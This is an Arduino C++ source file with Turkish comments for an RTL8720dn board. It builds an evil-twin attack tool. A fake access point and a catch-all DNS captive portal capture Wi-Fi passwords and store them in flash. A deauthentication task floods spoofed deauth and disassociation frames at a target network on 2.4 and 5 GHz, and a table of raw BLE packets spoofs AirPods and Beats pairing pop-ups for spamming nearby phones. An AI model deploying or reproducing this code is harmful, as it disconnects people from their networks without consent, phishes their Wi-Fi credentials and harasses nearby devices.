// AP+STA Captive Portal — RTL8720dn (AmebaD)
// FIX VERSION: WiFi Scan Sorunu Çözüldü + Bağlantı Hızı ve Yönlendirme İyileştirildi

#include "sys_api.h"  
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include "FlashMemory.h"
#include "wifi_conf.h"
#include "wifi_structures.h"
#include "FreeRTOS.h"
#include "task.h"
#include "semphr.h"
#include "BLEDevice.h"
#include "BLEAdvertData.h"

// AmebaD BLE gap katmanı — rastgele MAC ve cihaz adı için low-level erişim
// le_gen_rand_addr / le_set_rand_addr SDK header'larında (gap_le.h) zaten T_GAP_CAUSE ile tanımlı
// — tekrar bildirmiyoruz, sadece le_adv_set_param eksik olduğu için onu bildiriyoruz
extern "C" {
  bool le_adv_set_param(uint8_t param, uint8_t len, void *p_value);
}

// ── WiFi BB register yazımı neden YOK ────────────────────────────────────────
// RTL8720DN çift çekirdeklidir: KM0 (WiFi sürücüsü) + KM4 (Arduino kodu).
// WiFi BB register'ları (0x40080000+) yalnızca KM0 bus alanındadır.
// KM4'ten doğrudan pointer ile yazım çalışmaz (0xEAEAEAEA bus hata yanıtı).
// rtw_hal_write_bbreg() denendi ancak rltk_wlan_info adapter pointer'ı
// geçersiz olduğunda setup() crash ediyor — AP kalkmıyor.
// Güç yönetimi wifi_disable_powersave() ile yapılıyor; bu SDK IPC çağrısıdır.

#undef max
#undef min
#include <vector>

#include "lwip/netif.h"
#include <lwip/netifapi.h>
#include <lwip/udp.h>
#include <lwip/arch.h>
#include <lwip/def.h>

#ifndef ENC_TYPE_TKIP
#define ENC_TYPE_TKIP  2
#endif
#ifndef ENC_TYPE_CCMP
#define ENC_TYPE_CCMP  4
#endif
#ifndef ENC_TYPE_WPA3
#define ENC_TYPE_WPA3  5
#endif

extern "C" {
  extern struct netif xnetif[];
  void dhcps_init(struct netif *pnetif);
  void dhcps_deinit(void);
  int  LwIP_DHCP(uint8_t idx, uint8_t action);
  int  wext_set_mode(const char *ifname, int mode);
  int  wifi_disconnect(void);
  void LwIP_Init(void);
  int  wext_send_mgnt(const char *ifname, char *buf, uint16_t buf_len, uint16_t flags);
  int  wifi_set_channel(int channel); 
  int  wifi_disable_powersave(void);
  int  wifi_set_mode(rtw_mode_t mode);
  int  wifi_scan_networks(rtw_scan_result_handler_t handler, void *user_data);
  int  wifi_is_connected_to_ap(void);
  int  wifi_connect(char *ssid, rtw_security_t security_type, char *password, int ssid_len, int password_len, int key_id, void *semaphore);
}

// ── WiFi BB register yazımı neden YOK ────────────────────────────────────────
// RTL8720DN çift çekirdeklidir: KM0 (WiFi sürücüsü) + KM4 (Arduino kodu).
// WiFi BB register'ları (0x40080000+) yalnızca KM0 bus alanındadır.
// KM4'ten bu adreslere yazıldığında bus matrisi yazımı reddeder → 0xEAEAEAEA
// okunur (bus hata yanıtı). Doğrudan register yazımı çalışmaz.
// Güç yönetimi wifi_disable_powersave() ile sağlanıyor — o bir SDK IPC çağrısı
// olduğu için KM0 üzerinden gerçekten işlem görür.

#ifndef PACK_STRUCT_FIELD
#define PACK_STRUCT_FIELD(x) x
#endif

#ifndef PACK_STRUCT_STRUCT
#ifdef __GNUC__
#define PACK_STRUCT_STRUCT __attribute__((packed))
#else
#define PACK_STRUCT_STRUCT
#endif
#endif

#define DNS_HEADER_SIZE 12
#define DNS_SERVER_PORT 53

struct dns_hdr {
    PACK_STRUCT_FIELD(u16_t id);
    PACK_STRUCT_FIELD(u8_t flags1);
    PACK_STRUCT_FIELD(u8_t flags2);
    PACK_STRUCT_FIELD(u16_t numquestions);
    PACK_STRUCT_FIELD(u16_t numanswers);
    PACK_STRUCT_FIELD(u16_t numauthrr);
    PACK_STRUCT_FIELD(u16_t numextrarr);
} PACK_STRUCT_STRUCT;

struct DNSHeader {
    uint16_t ID;
    union {
        struct {
            uint16_t RD     : 1;
            uint16_t TC     : 1;
            uint16_t AA     : 1;
            uint16_t OPCode : 4;
            uint16_t QR     : 1;
            uint16_t RCode  : 4;
            uint16_t Z      : 3;
            uint16_t RA     : 1;
        };
        uint16_t Flags;
    };
    uint16_t QDCount;
    uint16_t ANCount;
    uint16_t NSCount;
    uint16_t ARCount;
};

struct DNSQuestion {
    const uint8_t *QName;
    uint16_t QNameLength;
    uint16_t QType;
    uint16_t QClass;
};

class DNSServer {
public:
    DNSServer() {
        _resolvedIP[0] = 192; _resolvedIP[1] = 168; _resolvedIP[2] = 4; _resolvedIP[3] = 1;
        _dns_server_pcb = NULL;
    }
    void setResolvedIP(uint8_t ip0, uint8_t ip1, uint8_t ip2, uint8_t ip3) {
        _resolvedIP[0] = ip0; _resolvedIP[1] = ip1; _resolvedIP[2] = ip2; _resolvedIP[3] = ip3;
    }
    bool requestIncludesOnlyOneQuestion(DNSHeader &dnsHeader) {
        return ntohs(dnsHeader.QDCount) == 1 && dnsHeader.ANCount == 0 && dnsHeader.NSCount == 0 && dnsHeader.ARCount == 0;
    }
    void begin();
    void stop();
    uint8_t _resolvedIP[4];
private:
    struct udp_pcb *_dns_server_pcb;
    static void packetHandler(void *arg, struct udp_pcb *udp_pcb, struct pbuf *udp_packet_buffer, struct ip_addr *sender_addr, uint16_t sender_port);
};

static DNSServer* dnsServerInstance = NULL;

void DNSServer::begin() {
    dnsServerInstance = this;
    struct udp_pcb *pcb;
    for (pcb = udp_pcbs; pcb != NULL; pcb = pcb->next) {
        if (pcb->local_port == DNS_SERVER_PORT) udp_remove(pcb);
    }
    for (int _retry = 0; _retry < 3 && !_dns_server_pcb; _retry++) {
        _dns_server_pcb = udp_new();
        if (!_dns_server_pcb) delay(50);
    }
    if (!_dns_server_pcb) return;
    udp_bind(_dns_server_pcb, IP4_ADDR_ANY, DNS_SERVER_PORT);
    udp_recv(_dns_server_pcb, (udp_recv_fn)packetHandler, NULL);
}

void DNSServer::stop() {
    if (_dns_server_pcb) {
        udp_remove(_dns_server_pcb);
        _dns_server_pcb = NULL;
        dnsServerInstance = NULL;
    }
}

void DNSServer::packetHandler(void *arg, struct udp_pcb *udp_pcb, struct pbuf *udp_packet_buffer, struct ip_addr *sender_addr, uint16_t sender_port) {
    (void)arg;
    if (!dnsServerInstance || !udp_packet_buffer || udp_packet_buffer->len < DNS_HEADER_SIZE) {
        if (udp_packet_buffer) pbuf_free(udp_packet_buffer);
        return;
    }

    DNSHeader dnsHeader;
    DNSQuestion dnsQuestion;
    memcpy(&dnsHeader, udp_packet_buffer->payload, DNS_HEADER_SIZE);

    if (dnsServerInstance->requestIncludesOnlyOneQuestion(dnsHeader)) {
        if (udp_packet_buffer->len <= DNS_HEADER_SIZE) { pbuf_free(udp_packet_buffer); return; }

        uint16_t offset = DNS_HEADER_SIZE;
        uint16_t nameLength = 0;
        while (offset < udp_packet_buffer->len && ((uint8_t*)udp_packet_buffer->payload)[offset] != 0) {
            nameLength++; offset++;
        }
        if (offset >= udp_packet_buffer->len - 4) { pbuf_free(udp_packet_buffer); return; }

        offset++; nameLength++;
        dnsQuestion.QName = (uint8_t *)udp_packet_buffer->payload + DNS_HEADER_SIZE;
        dnsQuestion.QNameLength = nameLength;
        int sizeUrl = static_cast<int>(nameLength);

        struct dns_hdr *hdr = (struct dns_hdr *)udp_packet_buffer->payload;
        struct pbuf *p = pbuf_alloc(PBUF_TRANSPORT, sizeof(struct dns_hdr) + sizeUrl + 20, PBUF_RAM);
        if (p) {
            struct dns_hdr *rsp_hdr = (struct dns_hdr *)p->payload;
            rsp_hdr->id = hdr->id;
            rsp_hdr->flags1 = 0x85;
            rsp_hdr->flags2 = 0x80;
            rsp_hdr->numquestions = PP_HTONS(1);
            rsp_hdr->numanswers = PP_HTONS(1);
            rsp_hdr->numauthrr = PP_HTONS(0);
            rsp_hdr->numextrarr = PP_HTONS(0);

            uint8_t *responsePtr = (uint8_t *)rsp_hdr + sizeof(struct dns_hdr);
            memcpy(responsePtr, dnsQuestion.QName, sizeUrl);
            responsePtr += sizeUrl;
            *(uint16_t *)responsePtr = PP_HTONS(1);
            *(uint16_t *)(responsePtr + 2) = PP_HTONS(1);
            responsePtr[4] = 0xc0; responsePtr[5] = 0x0c;
            *(uint16_t *)(responsePtr + 6) = PP_HTONS(1);
            *(uint16_t *)(responsePtr + 8) = PP_HTONS(1);
            *(uint32_t *)(responsePtr + 10) = PP_HTONL(60);
            *(uint16_t *)(responsePtr + 14) = PP_HTONS(4);
            memcpy(responsePtr + 16, dnsServerInstance->_resolvedIP, 4);

            udp_sendto(udp_pcb, p, sender_addr, sender_port);
            pbuf_free(p);
        }
    } else {
        struct pbuf *p = pbuf_alloc(PBUF_TRANSPORT, udp_packet_buffer->len, PBUF_RAM);
        if (p) {
            memcpy(p->payload, udp_packet_buffer->payload, udp_packet_buffer->len);
            struct dns_hdr *dns_rsp = (struct dns_hdr *)p->payload;
            dns_rsp->flags1 |= 0x80;
            dns_rsp->flags2 = 0x05;
            udp_sendto(udp_pcb, p, sender_addr, sender_port);
            pbuf_free(p);
        }
    }
    pbuf_free(udp_packet_buffer);
}

// ══════════════════════════════════════════════════════════════════════════════
// ═══════════════════════ TURBO MODE PARAMETRELERI ════════════════════════════
// ══════════════════════════════════════════════════════════════════════════════

#define DHCP_START   1
#define DHCP_STOP    0
#define IW_MODE_INFRA 2
#define WLAN0_NAME   "wlan0"

#define AP_INITIAL_SSID  "X"
#define AP_INITIAL_PASS  "20192019"
#define AP_IP_ADDR       "192.168.4.1"
#define SERVER_PORT      80

#define FLASH_MAGIC      0xAB
#define MAX_SSID_LEN     64
#define MAX_PASS_LEN     64
#define FLASH_BUF_SIZE   256
#define FLASH_OFFSET     0x00100000 

// ═══════════════════════ DEAUTH AYARLARI (SKB BUFFER SAFE) ════════════════════
#define DEAUTH_BURST_INTERVAL_MS    120
#define DEAUTH_FRAME_COUNT_2G       4
#define DEAUTH_FRAME_COUNT_5G       4
#define DEAUTH_TASK_DELAY_2G        15
#define DEAUTH_TASK_DELAY_5G        12
#define CHANNEL_SWITCH_DELAY_MS     10
#define EXTRA_BURST_COUNT_2G        1
#define EXTRA_BURST_COUNT_5G        2
#define EXTRA_BURST_DELAY_MS        10
#define DEAUTH_FRAME_INTER_DELAY_MS 3
#define DEAUTH_SKB_BACKOFF_MS       20

// ═══════════════════════ SCAN PARAMETRELERI (FIX) ═════════════════════════════
#define SCAN_TIMEOUT_MS             15000   // Scan için timeout
#define SCAN_RETRY_COUNT            3       // Kaç kez retry yapacak
#define SCAN_RESULT_WAIT_MS         10000   // Sonuçları bekleme süresi

struct SavedCredentials {
  uint8_t magic;
  char    ssid[MAX_SSID_LEN];
  char    pass[MAX_PASS_LEN];
};

struct NetworkInfo {
  String         ssid;
  uint8_t        bssid[6];
  int32_t        rssi;
  uint8_t        enc;
  rtw_security_t raw_sec;
  int32_t        channel;
};

typedef enum { CS_IDLE = 0, CS_RUNNING = 1, CS_DONE_OK = 2, CS_DONE_FAIL = 3 } ConnStatus;
volatile ConnStatus conn_status = CS_IDLE;

typedef enum { SCAN_IDLE = 0, SCAN_RUNNING = 1, SCAN_DONE = 2 } ScanStatus;
volatile ScanStatus scan_status = SCAN_IDLE;

bool ap_switched = false;
bool pending_ap_switch = false;
unsigned long revert_time = 0; 

char target_ssid[MAX_SSID_LEN] = {0};
uint8_t target_bssid[6]    = {0};
uint8_t target_5g_bssid[6] = {0};
int32_t target_channel = 6;
uint8_t target_enc     = ENC_TYPE_CCMP;
rtw_security_t target_sec     = RTW_SECURITY_WPA2_AES_PSK;
volatile int32_t target_5g_channel = 0;

uint8_t fake_ap_bssid[6] = {0};

volatile bool deauth_active = false;
volatile bool deauth_all_active = false;
volatile bool ble_flood_active = false;
volatile bool portal_busy   = false;
int32_t ap_running_channel  = -1;
unsigned long last_netif_check_ms = 0;
#define NETIF_CHECK_INTERVAL_MS 3000UL

WiFiServer server(SERVER_PORT); 
DNSServer  dnsServer;

std::vector<NetworkInfo> networks;
SemaphoreHandle_t networks_mutex;
SemaphoreHandle_t raw_scan_sem = NULL;

char saved_ssid[MAX_SSID_LEN]   = {0};
char saved_pass[MAX_PASS_LEN]   = {0};
char pending_ssid[MAX_SSID_LEN] = {0};
char pending_pass[MAX_PASS_LEN] = {0};
rtw_security_t pending_sec      = RTW_SECURITY_WPA2_AES_PSK;
bool sta_connected  = false;
String conn_result  = "";

unsigned long last_scan_ms = 0;
#define RESCAN_INTERVAL_MS  600000UL

unsigned long last_channel_check_ms = 0;
#define CHANNEL_CHECK_INTERVAL_MS 5000UL


bool isFakeAPBSSID(const uint8_t *bssid) {
  return memcmp(bssid, fake_ap_bssid, 6) == 0;
}

String urlDecode(String input) {
  String output = "";
  for (int i = 0; i < (int)input.length(); i++) {
    if (input[i] == '+') output += ' ';
    else if (input[i] == '%' && i + 2 < (int)input.length()) {
      char hex[3] = { input[i + 1], input[i + 2], 0 };
      output += (char)strtol(hex, nullptr, 16);
      i += 2;
    } else output += input[i];
  }
  return output;
}

void loadCredentials() {
  FlashMemory.read();
  SavedCredentials creds;
  memcpy(&creds, FlashMemory.buf, sizeof(creds));
  if (creds.magic == FLASH_MAGIC && creds.ssid[0] != 0) {
    strncpy(saved_ssid, creds.ssid, MAX_SSID_LEN - 1);
    strncpy(saved_pass, creds.pass, MAX_PASS_LEN - 1);
  }
}

void saveCredentials(const char *ssid, const char *pass) {
  FlashMemory.read(); 
  SavedCredentials creds;
  creds.magic = FLASH_MAGIC;
  memset(creds.ssid, 0, MAX_SSID_LEN);
  memset(creds.pass, 0, MAX_PASS_LEN);
  strncpy(creds.ssid, ssid, MAX_SSID_LEN - 1);
  strncpy(creds.pass, pass, MAX_PASS_LEN - 1);
  memcpy(FlashMemory.buf, &creds, sizeof(creds));
  FlashMemory.update();
  delay(500);
}

rtw_security_t mapSecurity(uint8_t enc) {
  switch (enc) {
    case ENC_TYPE_NONE: return RTW_SECURITY_OPEN;
    case ENC_TYPE_WEP:  return RTW_SECURITY_WEP_PSK;
    case ENC_TYPE_TKIP: return RTW_SECURITY_WPA_TKIP_PSK;
    default:            return RTW_SECURITY_WPA2_AES_PSK;
  }
}

bool isSisterBSSID(const uint8_t *base, const uint8_t *candidate) {
  for (int i = 0; i < 5; i++) {
    if (base[i] != candidate[i]) return false;
  }
  int diff = (int)candidate[5] - (int)base[5];
  if (diff < 0) diff = -diff;
  return (diff >= 1 && diff <= 4);
}

// ─── AĞ TARAYICI (FIX VERSIYONU) ─────────────────────────────────────────────
static std::vector<NetworkInfo> scan_temp;
static volatile int scan_result_count = 0;

rtw_result_t raw_scan_handler(rtw_scan_handler_result_t *malloced_scan_result) {
  if (malloced_scan_result == NULL) {
    return RTW_SUCCESS;
  }

  if (malloced_scan_result->scan_complete != RTW_TRUE) {
    rtw_scan_result_t *record = &malloced_scan_result->ap_details;
    if (record == NULL) {
      return RTW_SUCCESS;
    }

    NetworkInfo net;
    char ssid_str[33] = {0};

    // SSID'yi güvenli şekilde kopyala
    if (record->SSID.len > 0 && record->SSID.len <= 32) {
      memcpy(ssid_str, record->SSID.val, record->SSID.len);
      ssid_str[record->SSID.len] = '\0';
    }

    net.ssid = String(ssid_str);
    net.rssi = record->signal_strength;
    net.channel = record->channel; 

    // BSSID'yi kopyala
    if (record->BSSID.octet != NULL) {
      memcpy(net.bssid, record->BSSID.octet, 6);
    } else {
      memset(net.bssid, 0, 6);
    }

    // Security türünü belirle
    net.raw_sec = record->security;
    if (record->security == RTW_SECURITY_OPEN) {
      net.enc = ENC_TYPE_NONE;
    } else if (record->security == RTW_SECURITY_WEP_PSK) {
      net.enc = ENC_TYPE_WEP;
    } else if (record->security == RTW_SECURITY_WPA_TKIP_PSK || 
               record->security == RTW_SECURITY_WPA_AES_PSK || 
               record->security == RTW_SECURITY_WPA_MIXED_PSK) {
      net.enc = ENC_TYPE_TKIP;
    } else if (record->security == RTW_SECURITY_WPA3_AES_PSK || 
               record->security == RTW_SECURITY_WPA2_WPA3_MIXED) {
      net.enc = ENC_TYPE_WPA3;
    } else {
      net.enc = ENC_TYPE_CCMP;
    }

    if (net.ssid.length() > 0) {
      // Fake AP BSSID'sini kontrol et
      if (isFakeAPBSSID(net.bssid)) {
        return RTW_SUCCESS;
      }

      // 5GHz sister BSSID kontrolü
      if (net.channel >= 36 && target_bssid[0] != 0 && isSisterBSSID(target_bssid, net.bssid)) {
        target_5g_channel = net.channel;
        memcpy(target_5g_bssid, net.bssid, 6);
      }

      // Duplicate kontrol
      bool dup = false;
      for (auto &existing : scan_temp) {
        if (existing.ssid == net.ssid) {
          dup = true;
          if (net.rssi > existing.rssi) {
            existing.rssi    = net.rssi;
            existing.channel = net.channel;
            existing.enc     = net.enc;
            existing.raw_sec = net.raw_sec;
            memcpy(existing.bssid, net.bssid, 6);
          }
          break;
        }
      }

      if (!dup) {
        scan_temp.push_back(net);
        scan_result_count++;
      }
    }
  } else {
    if (raw_scan_sem != NULL) {
      xSemaphoreGive(raw_scan_sem);
    }
  }

  return RTW_SUCCESS;
}

void scanNetworkTask(void *param) {
  (void)param;

  scan_temp.clear();
  scan_result_count = 0;

  if (raw_scan_sem == NULL) {
    raw_scan_sem = xSemaphoreCreateBinary();
  }

  wifi_disable_powersave();
  wifi_scan_networks(raw_scan_handler, NULL);

  if (raw_scan_sem != NULL) {
    xSemaphoreTake(raw_scan_sem, pdMS_TO_TICKS(SCAN_RESULT_WAIT_MS));
  }

  if (networks_mutex) {
    if (xSemaphoreTake(networks_mutex, pdMS_TO_TICKS(500)) == pdTRUE) {
      networks = scan_temp;
      xSemaphoreGive(networks_mutex);
    }
  }

  scan_temp.clear();
  last_scan_ms = millis();
  scan_status = SCAN_DONE;

  vTaskDelete(NULL);
}

void startScan() {
  if (scan_status == SCAN_RUNNING) {
    return;
  }
  if (conn_status == CS_RUNNING) {
    return;
  }

  scan_status = SCAN_RUNNING;

  xTaskCreate(scanNetworkTask, "scan", 8192, NULL, tskIDLE_PRIORITY + 2, NULL);
}

// ─── BAĞLANTI GÖREVİ (SPEED OPTIMIZED) ────────────────────────────────────────
void wifiConnectTask(void *param) {
  (void)param;
  bool is_open  = (pending_sec == RTW_SECURITY_OPEN);
  int  pass_len = is_open ? 0 : (int)strlen(pending_pass);
  int  ret      = RTW_ERROR;


  wifi_disconnect();
  vTaskDelay(pdMS_TO_TICKS(50));  // HIZLI BAĞLANTI İÇİN 50ms'e indirildi

  TickType_t t_start = xTaskGetTickCount();
  ret = wifi_connect((char *)pending_ssid, pending_sec,
                     (char *)pending_pass, (int)strlen(pending_ssid), pass_len, -1, NULL);
  uint32_t elapsed_ms = (xTaskGetTickCount() - t_start) * portTICK_PERIOD_MS;

  if (ret == RTW_SUCCESS) {
    vTaskDelay(pdMS_TO_TICKS(100));  // 100ms'e indirildi (200'den)
    if (wifi_is_connected_to_ap() != RTW_SUCCESS) ret = RTW_ERROR;
  }

  if (ret != RTW_SUCCESS && !is_open && elapsed_ms < 2000) {
    rtw_security_t fallback;
    if (pending_sec == RTW_SECURITY_WPA3_AES_PSK) {
      fallback = RTW_SECURITY_WPA2_WPA3_MIXED;
    } else if (pending_sec == RTW_SECURITY_WPA2_WPA3_MIXED) {
      fallback = RTW_SECURITY_WPA3_AES_PSK;
    } else {
      fallback = RTW_SECURITY_WPA2_MIXED_PSK;
    }
    wifi_disconnect();
    vTaskDelay(pdMS_TO_TICKS(50));  // 50ms'e indirildi
    ret = wifi_connect((char *)pending_ssid, fallback,
                       (char *)pending_pass, (int)strlen(pending_ssid), pass_len, -1, NULL);
    if (ret == RTW_SUCCESS) {
      vTaskDelay(pdMS_TO_TICKS(100));  // 100ms'e indirildi
      if (wifi_is_connected_to_ap() != RTW_SUCCESS) ret = RTW_ERROR;
    }
  }

  if (ret == RTW_SUCCESS) {
    vTaskDelay(pdMS_TO_TICKS(100));  // 100ms'e indirildi
    wifi_disable_powersave();
    conn_status = CS_DONE_OK;
  } else {
    conn_status = CS_DONE_FAIL;
  }
  vTaskDelete(NULL);
}

void startConnectTask() {
  if (conn_status == CS_RUNNING) return;
  conn_status = CS_RUNNING;
  xTaskCreate(wifiConnectTask, "wconn", 8192, NULL, tskIDLE_PRIORITY + 2, NULL);
}

// ═══════════════════════════════════════════════════════════════════════════════
// ═══ SKB-SAFE frame gönderici: hata durumunda backoff uygular ════════════════
// ═══════════════════════════════════════════════════════════════════════════════
static uint32_t safeSendMgnt_ok_count  = 0;
static uint32_t safeSendMgnt_err_count = 0;

static inline void safeSendMgnt(uint8_t *frame, uint16_t len) {
  int ret = wext_send_mgnt(WLAN0_NAME, (char*)frame, len, 0);
  if (ret < 0) {
    safeSendMgnt_err_count++;
    vTaskDelay(pdMS_TO_TICKS(DEAUTH_SKB_BACKOFF_MS));
  } else {
    safeSendMgnt_ok_count++;
    vTaskDelay(pdMS_TO_TICKS(DEAUTH_FRAME_INTER_DELAY_MS));
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// ═══════════ DEAUTH GÖREVİ (SKB BUFFER KORUMALR - 2.4GHz & 5GHz) ═══════════
// ═══════════════════════════════════════════════════════════════════════════════
void deauthTask(void *param) {
  (void)param;

  uint8_t frame_template[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x07, 0x00 
  };

  wifi_disable_powersave();

  unsigned long last_deauth_burst = millis();
  uint32_t burst_counter = 0;

  while (deauth_active) {

    if (millis() - last_channel_check_ms > CHANNEL_CHECK_INTERVAL_MS) {
        last_channel_check_ms = millis();
    }

    if (millis() - last_deauth_burst < DEAUTH_BURST_INTERVAL_MS) {
      vTaskDelay(pdMS_TO_TICKS(5));
      continue;
    }
    last_deauth_burst = millis();

    if ((++burst_counter & 0x07) == 0) {
      wifi_disable_powersave();
    }

    // 2.4GHz DEAUTH
    wifi_set_channel(target_channel);
    wifi_disable_powersave();
    vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY_MS));

    for (int burst = 0; burst < DEAUTH_FRAME_COUNT_2G; burst++) {
      for (int offset = -1; offset <= 1; offset++) {
          uint8_t temp_bssid[6];
          memcpy(temp_bssid, target_bssid, 6);
          temp_bssid[5] = (uint8_t)(temp_bssid[5] + offset);

          if (isFakeAPBSSID(temp_bssid)) {
            continue;
          }

          memcpy(&frame_template[10], temp_bssid, 6);
          memcpy(&frame_template[16], temp_bssid, 6);
          memset(&frame_template[4], 0xFF, 6);
          frame_template[0] = 0xC0; frame_template[24] = 0x07;
          safeSendMgnt(frame_template, 26);

          frame_template[24] = 0x02;
          safeSendMgnt(frame_template, 26);

          memcpy(&frame_template[4], temp_bssid, 6);
          frame_template[0] = 0xC0; frame_template[24] = 0x07;
          safeSendMgnt(frame_template, 26);

          frame_template[0] = 0xA0; frame_template[24] = 0x07;
          safeSendMgnt(frame_template, 26);
      }
      vTaskDelay(pdMS_TO_TICKS(DEAUTH_TASK_DELAY_2G));
    }

    for (int extra_burst = 0; extra_burst < EXTRA_BURST_COUNT_2G; extra_burst++) {
        for (int offset = -1; offset <= 1; offset++) {
            uint8_t temp_bssid[6];
            memcpy(temp_bssid, target_bssid, 6);
            temp_bssid[5] = (uint8_t)(temp_bssid[5] + offset);

            if (!isFakeAPBSSID(temp_bssid)) {
                memcpy(&frame_template[10], temp_bssid, 6);
                memcpy(&frame_template[16], temp_bssid, 6);
                memset(&frame_template[4], 0xFF, 6);
                frame_template[0] = 0xC0; frame_template[24] = 0x07;
                safeSendMgnt(frame_template, 26);
                safeSendMgnt(frame_template, 26);
            }
        }
        vTaskDelay(pdMS_TO_TICKS(EXTRA_BURST_DELAY_MS));
    }

    // 5GHz DEAUTH
    int32_t ch5g = target_5g_channel;
    uint8_t bssid5g[6];
    memcpy(bssid5g, target_5g_bssid, 6);

    if (ch5g > 0 && ch5g != target_channel && bssid5g[0] != 0 && !isFakeAPBSSID(bssid5g)) {
        wifi_set_channel(ch5g);
        wifi_disable_powersave();
        vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY_MS));

        for (int burst = 0; burst < DEAUTH_FRAME_COUNT_5G; burst++) {
            for (int offset = -1; offset <= 1; offset++) {
                uint8_t temp5g[6];
                memcpy(temp5g, bssid5g, 6);
                temp5g[5] = (uint8_t)(temp5g[5] + offset);

                if (isFakeAPBSSID(temp5g)) {
                  continue;
                }

                memcpy(&frame_template[10], temp5g, 6);
                memcpy(&frame_template[16], temp5g, 6);
                memset(&frame_template[4], 0xFF, 6);
                frame_template[0] = 0xC0; frame_template[24] = 0x07;
                safeSendMgnt(frame_template, 26);

                frame_template[24] = 0x02;
                safeSendMgnt(frame_template, 26);

                memcpy(&frame_template[4], temp5g, 6);
                frame_template[0] = 0xC0; frame_template[24] = 0x07;
                safeSendMgnt(frame_template, 26);

                frame_template[0] = 0xA0; frame_template[24] = 0x07;
                safeSendMgnt(frame_template, 26);
            }
            vTaskDelay(pdMS_TO_TICKS(DEAUTH_TASK_DELAY_5G));
        }

        for (int extra_burst = 0; extra_burst < EXTRA_BURST_COUNT_5G; extra_burst++) {
            for (int offset = -1; offset <= 1; offset++) {
                uint8_t temp5g[6];
                memcpy(temp5g, bssid5g, 6);
                temp5g[5] = (uint8_t)(temp5g[5] + offset);

                if (!isFakeAPBSSID(temp5g)) {
                    memcpy(&frame_template[10], temp5g, 6);
                    memcpy(&frame_template[16], temp5g, 6);
                    memset(&frame_template[4], 0xFF, 6);
                    frame_template[0] = 0xC0; frame_template[24] = 0x07;
                    safeSendMgnt(frame_template, 26);
                    safeSendMgnt(frame_template, 26);
                }
            }
            vTaskDelay(pdMS_TO_TICKS(EXTRA_BURST_DELAY_MS));
        }
    }

    wifi_set_channel(target_channel);
    wifi_disable_powersave();
    vTaskDelay(pdMS_TO_TICKS(5));
  }
  vTaskDelete(NULL);
}

// ═══════════════════════════════════════════════════════════════════════════════
// ════════════════ BLE RAW PAKET VERİTABANI (REFERANS: sprensis/BLE-spam-BW16) ═
// ═══════════════════════════════════════════════════════════════════════════════
// Doğru yöntem: Ham raw AD yapısı baytları addData() ile gönderilir.
// iOS/Android manufacturer data payload'ını tanır, GAP cihaz adına bakmaz.
// setAdvType(GAP_ADTYPE_ADV_NONCONN_IND) → non-connectable: AMEBA_BLE_DEV görünmez.
// Her paket: [length][AD_type][data...] tam AD yapısı olarak gönderilir.
// ─────────────────────────────────────────────────────────────────────────────

// ── Apple Proximity Pairing — tam 31 byte raw AD paketi ──────────────────────
// [0x1e=30][0xff=ManufSpec][0x4c,0x00=Apple][0x07=ProxPairing][0x19=len25]
// [flags][model_byte][status][bat_lid][bat_R][bat_L][color][suffix][account_token x15]
static uint8_t ble_Airpods[31]        = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static uint8_t ble_AirpodsPro[31]     = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static uint8_t ble_AirpodsMax[31]     = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static uint8_t ble_AirpodsGen2[31]    = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static uint8_t ble_AirpodsGen3[31]    = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static uint8_t ble_AirpodsPro2[31]    = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static uint8_t ble_PowerBeats[31]     = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x03,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static uint8_t ble_PowerBeatsPro[31]  = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0b,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static uint8_t ble_BeatsSoloPro[31]   = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0c,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static uint8_t ble_BeatsStudio3[31]   = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x09,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
